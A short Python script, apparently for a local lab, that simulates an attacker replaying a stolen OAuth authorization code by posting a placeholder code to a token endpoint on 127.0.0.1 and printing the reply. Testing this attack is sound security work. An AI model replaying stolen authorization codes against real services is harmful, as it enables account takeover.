import requests

# simulate attacker using stolen authorization code
code = "STOLEN_AUTH_CODE"

response = requests.post(
    "http://127.0.0.1:5000/token",
    data={
        "code": code
    }
)

print("Server response:")
print(response.text)
